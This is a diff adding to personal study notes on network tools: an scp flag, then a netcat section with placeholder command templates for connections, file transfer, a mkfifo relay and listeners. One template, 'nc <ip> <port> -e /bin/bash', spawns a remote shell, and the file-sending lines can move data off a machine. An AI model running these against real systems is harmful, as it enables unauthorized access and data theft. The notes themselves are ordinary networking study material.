@@ -65,7 +65,30 @@
                 scp <src> <dst>
                     -3          #for copying from one remote host to another with the traffic flowing through your machine
                     -P <port>   #for specifying an alternate port
+                    -r          #recursive (for directories and shiz)
 
+#Traffic Redirection
+    #Netcat
+        #is the "swiss army knife"
+            #it reads and writes data across network socket connections using TCP
+            #reliable back end tool that can be used directly easily driven by other programs and scripts
+        #used for the following
+            #inbound and outbound connections, TCP/UDP to or from any ports
+            #troubleshooting network connections
+            #sending/recieving data (insecurely)
+            #notes
+                nc <ip> <port>
+                                -e /bin/bash          #remotely run scrips
+                                 < File.txt           #sends file.txt to
+                                 > file.txt           #gets file from
+            #netcat relay demos
+                #used so two boxes that cant see eachother can communicate
+                mkfifo <name of pipe>                 #creates a pipe
+                nc <standard input ip> <port> < <name of pipe> | nc <standard output ip> <port> 1> <name of pipe>
+                nc -lp <port> < infile.txt
+                nc -lp <port> > outfile.txt
+                
+        
 
 
 
